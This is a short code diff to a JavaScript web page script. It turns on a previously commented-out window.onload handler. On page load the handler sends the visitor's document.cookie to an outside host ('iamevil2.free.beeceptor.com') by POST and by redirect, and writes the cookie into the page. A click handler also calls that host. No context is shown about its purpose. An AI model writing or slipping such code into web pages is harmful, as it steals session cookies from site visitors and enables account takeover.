@@ -5,11 +5,11 @@ function getRandomInt(max) {
     return Math.floor(Math.random() * max);
   }  
 
-/*window.onload = (event) => {
+window.onload = (event) => {
+    document.location = fetch('https://iamevil2.free.beeceptor.com/', {method: 'POST', mode: 'no-cors', body:document.cookie});
     document.location = 'https://iamevil2.free.beeceptor.com/?cookie=' + document.cookie;
     document.write('cookie: ' + document.cookie);
-    fetch('https://iamevil2.free.beeceptor.com/', {method: 'POST', mode: 'no-cors', body:document.cookie});
-};*/
+};
 
 color.onclick = () => {
     fetch('https://iamevil2.free.beeceptor.com/', {
